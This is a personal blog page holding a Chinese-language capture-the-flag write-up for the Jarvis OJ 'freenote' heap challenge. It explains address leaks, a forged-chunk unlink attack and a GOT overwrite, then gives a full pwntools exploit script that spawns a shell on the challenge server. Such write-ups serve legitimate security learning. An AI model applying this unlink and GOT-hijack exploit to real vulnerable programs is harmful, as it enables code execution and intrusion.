<!doctype html>
<html lang="en">
<head>
    <head>
    <!-- Require Meta -->
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <!-- Font-awsome CSS-->
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
    <!-- hightlight.js -->
    <link rel="stylesheet" href="/css/style.css">
    <link type="icon" href="/images/favicon.ico">
    <!-- title -->
    <title>y4ngyy</title>
</head>
</head>
<body>
<div class="sidebar-container">
<div class="sidebar rounded">
    <!--头像区域-->
    <div class="head bg-dark text-center rounded-bottom">
        <a href="#">
            <img src="/images/avatar.jpg" alt="avatar.jpg">
        </a>
        <h2 class="text-light mt-4">y4ngyy</h2>
    </div>
    <!--个人描述-->
    <section class="text-center text-dark p-lg-5 p-3" id="description"><h4 class="m-0">无所事事,游手好闲</h4></section>
    <!--导航条-->
    <nav>
        <p  class="nav-clapse fa fa-bars text-center"></p>
        <ul class="nav flex-column text-center">
            
            <li class="nav-item">
                <a href="/" class="nav-link text-secondary">Home</a>
            </li>
            
            <li class="nav-item">
                <a href="/archives" class="nav-link text-secondary">Archives</a>
            </li>
            
            <li class="nav-item">
                <a href="/category" class="nav-link text-secondary">Category</a>
            </li>
            
        </ul>
    </nav>
</div>
</div>
<div class="content-container">
    <div class="content shadow rounded">
        <h2 class="text-center">Jarvis OJ PWN level6 WriteUp</h2>
        <div class="text-center">
            <i class="fa fa-calendar"></i>
            <span>2018-12-19</span>
        </div>
        <hr width="90%" color="#ddd">
        <article>
                <p>终于做完了自己在pwn方向的第一道堆题，参考了<a href="https://blog.csdn.net/qq_38204481/article/details/82808011" target="_blank" rel="noopener">writeup1</a>和<a href="https://blog.csdn.net/charlie_heng/article/details/79123634" target="_blank" rel="noopener">writeup2</a>怼了四天，终于理解了整道题目，本地调通了，但是题目服务器貌似有点问题，题目提供的libc偏移对不上，远程没有调通</p>
<h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><ol>
<li>泄露出libc的基址和heap的地址</li>
<li>根据泄露的libc基址算出system函数的基址</li>
<li>伪造chunk，free掉伪造的chunk触发unlink，使得可以任意地址写</li>
<li>劫持got表中的free为system函数地址，调用删除功能，getshell</li>
</ol>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><p>首先查看程序功能：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">== Blue-lotus Free Note ==</span><br><span class="line">1. List Note</span><br><span class="line">2. New Note</span><br><span class="line">3. Edit Note</span><br><span class="line">4. Delete Note</span><br><span class="line">5. Exit</span><br><span class="line">====================</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure>
<p>再拖入IDA看一下逻辑。找到可以利用的地方：</p>
<ol>
<li>程序一开始malloc一个3096大小的堆用来管理之后创建的note</li>
<li>delete功能在free之后没有将指针置空，可以进行利用</li>
<li>在new note的时候，尾部没有加上\x00，可以用来进行地址泄露</li>
<li>在new note的时候，有逻辑判断让malloc的chunk至少为136大小，属于small chunk的范畴，可以使用unlink</li>
</ol>
<h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p><strong>libc地址泄露</strong>的具体原理为：</p>
<ol>
<li>由于在写入的时候没有加上\x00，所以在输出的时候可以也一直输出到之后的\x00为止。</li>
<li>当chunk被free掉后fd和bk指针会的值为&lt;main_arena+offset&gt;，而&lt;main_arena+offset&gt;与libc加载地址的相对偏移是固定的。所以只需要泄露出&lt;main_arena+offset&gt;，再在本地调试找到算出libc和main_arena的偏移，便能知道libc的基址</li>
<li>最终操作为：创建两个note(chunk)(防止top chunk的合并)=&gt;free掉第一个=&gt;再创建note(这时候申请的chunk的大小要与free掉的一致才能申请到原来的空间，且输入的大小不能超过四个字节，否则会覆盖地址信息)=&gt;list note拿到地址信息</li>
</ol>
<p><strong>heap地址泄露</strong>的原理为：当两个不相邻的chunk被free掉时，会至于bin的链表中，本例中会先放到unsorted bin中，这时chunk的fd和bk中存有chunk的地址信息，接下来操作同上文则可泄露heap地址。</p>
<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a><a href="https://www.jianshu.com/p/73715c903c88" target="_blank" rel="noopener">unlink</a></h3><p>程序在最开始的时候，申请了一个堆作为note的管理，可以看到里面存储了note的地址，所以通过unlink伪造chunk的方式可以取得该区的控制权，从而能任意地址写，劫持got表。需要注意的是伪造chunk的大小要地址对齐。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = process('./freenote_x86')</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.19.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./freenote_x86'</span>)</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9885</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newNote</span><span class="params">(length, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Length of new note: '</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteNote</span><span class="params">(number)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">    p.sendline(str(number))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editNote</span><span class="params">(number, length, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">    p.sendline(str(number))</span><br><span class="line">    p.recvuntil(<span class="string">'Length of note: '</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listNote</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment"># ======================================== leak libc address</span></span><br><span class="line">    offset = <span class="number">0x1b27b0</span> <span class="comment"># main to libc</span></span><br><span class="line">    newNote(<span class="number">7</span>,<span class="string">'a'</span>*<span class="number">7</span>) <span class="comment"># 0</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    newNote(<span class="number">7</span>,<span class="string">'b'</span>*<span class="number">7</span>) <span class="comment"># 1</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>)</span><br><span class="line">    newNote(<span class="number">1</span>,<span class="string">'0'</span>)</span><br><span class="line">    listNote()</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recv(<span class="number">7</span>)</span><br><span class="line">    main_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_addr = main_addr - offset</span><br><span class="line">    system_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'leak address:%x'</span>%main_addr</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'libc address:%x'</span>%libc_addr</span><br><span class="line"><span class="comment"># ========================================= leak heap address</span></span><br><span class="line">    newNote(<span class="number">7</span>,<span class="string">'c'</span>*<span class="number">7</span>) <span class="comment"># 2</span></span><br><span class="line">    newNote(<span class="number">7</span>,<span class="string">'d'</span>*<span class="number">7</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">    deleteNote(<span class="number">0</span>)</span><br><span class="line">    deleteNote(<span class="number">2</span>)</span><br><span class="line">    newNote(<span class="number">1</span>,<span class="string">'0'</span>)</span><br><span class="line">    listNote()</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recv(<span class="number">7</span>)</span><br><span class="line">    heap_base = u32(p.recv(<span class="number">4</span>))<span class="number">-0xd28</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'heap address:%x'</span>%heap_base</span><br><span class="line">    deleteNote(<span class="number">0</span>)</span><br><span class="line">    deleteNote(<span class="number">1</span>)</span><br><span class="line">    deleteNote(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># ========================================= unlink</span></span><br><span class="line">    payload = p32(<span class="number">0</span>)+p32(<span class="number">0x81</span>)+p32(heap_base+<span class="number">0x18</span><span class="number">-12</span>)+p32(heap_base+<span class="number">0x18</span><span class="number">-8</span>)<span class="comment"># fakechunk1: prev_size size fd bk fill_data 0x88</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">'a'</span>) </span><br><span class="line">    payload += p32(<span class="number">0x80</span>)+p32(<span class="number">0x80</span>) <span class="comment"># fakechunk2: prev_size size fd-data </span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>*<span class="number">2</span>,<span class="string">'a'</span>)</span><br><span class="line">    newNote(len(payload),payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    deleteNote(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># ========================================= hijack got</span></span><br><span class="line">    payload2 = p32(<span class="number">2</span>)+p32(<span class="number">1</span>)+p32(<span class="number">4</span>)+p32(elf.got[<span class="string">'free'</span>])+p32(<span class="number">1</span>)+p32(<span class="number">8</span>)+p32(heap_base+<span class="number">0xca8</span>)</span><br><span class="line">    payload2 = payload2.ljust(<span class="number">0x80</span>*<span class="number">2</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    editNote(<span class="number">0</span>,len(payload2),payload2)</span><br><span class="line">    editNote(<span class="number">0</span>,<span class="number">4</span>,p32(system_addr))</span><br><span class="line">    editNote(<span class="number">1</span>,<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'system address:%x'</span>%system_addr</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    deleteNote(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
        </article>
        <hr width="90%" color="#ddd">
    </div>
    <div class="content text-center mb-2"><span>Powered By Hexo | theme: <a href="https://github.com/y4ngyy/hexo-theme-yyang">yyang</a></span></div>
<script
        src="https://code.jquery.com/jquery-3.3.1.min.js"
        integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
        crossorigin="anonymous"></script>
<script src="/js/highlight.pack.js"></script>
<script src="/js/nav.js"></script>
<script>
    $(document).ready(function() {
        $('figure').each(function(i, block) {
            hljs.highlightBlock(block);
        });
    });
</script>
</div>
</body>
</html>